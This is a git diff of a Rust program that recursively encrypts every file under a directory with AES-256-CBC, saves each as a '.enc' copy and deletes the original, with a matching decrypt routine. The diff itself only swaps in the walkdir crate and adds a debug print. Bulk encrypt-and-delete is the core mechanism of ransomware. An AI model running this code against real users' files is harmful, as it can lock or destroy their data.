@@ -2,16 +2,19 @@ extern crate aes;
 extern crate block_modes;
 extern crate hex;
 extern crate rand;
+extern crate walkdir;
 
 use aes::Aes256;
 use block_modes::{BlockMode, Cbc};
 use block_modes::block_padding::Pkcs7;
+use walkdir::WalkDir;
 use std::fs::File;
 use std::path::Path;
 use std::fs;
 use std::io::{Read, Write};
 use std::error::Error;
 use std::str;
+use std::env;
 
 
 type Aes256Cbc = Cbc<Aes256, Pkcs7>;
@@ -54,30 +57,24 @@ fn decrypt_file(input_path: &str, output_path: &str) -> Result<(), Box<dyn Error
     Ok(())
 }
 
-fn get_files(directory_path: &str) -> Vec<String> {
-    let directory_path = Path::new(directory_path);
-    let entries = fs::read_dir(directory_path).expect("Failed to read directory");
-
-    let mut file_list = Vec::new();
-
-    for entry in entries {
-        let entry = entry.expect("Failed to read entry");
-        let file_path = entry.path();
-        if file_path.is_file() {
-            file_list.push(file_path.to_string_lossy().to_string());
-        } else if file_path.is_dir() {
-            let sub_files = get_files(file_path.to_string_lossy().as_ref());
-            file_list.extend(sub_files);
+fn get_all_files(dir: &str) -> Vec<String> {
+    let mut file_paths = Vec::new();
+    
+    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
+        if entry.file_type().is_file() {
+            file_paths.push(entry.path().display().to_string());
         }
     }
-
-    file_list
+    
+    file_paths
 }
 
+
 pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
-    let directory = get_files(directory_path);
+    let directory = get_all_files(directory_path);
     for mut file in directory {
         let encrypted_file_path = file.as_mut().to_owned() + ".enc";
+        dbg!(&encrypted_file_path);
         if encrypt_file(&file, &encrypted_file_path).is_err() { break; }
         if fs::remove_file(file).is_err() { break; }
     }
@@ -85,7 +82,7 @@ pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
 }
 
 pub fn decrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
-    let directory = get_files(directory_path);
+    let directory = get_all_files(&directory_path);
     for mut file in directory {
         let mut file_path = file.as_mut().to_owned();
         let ext_index = file_path.rfind('.').unwrap();
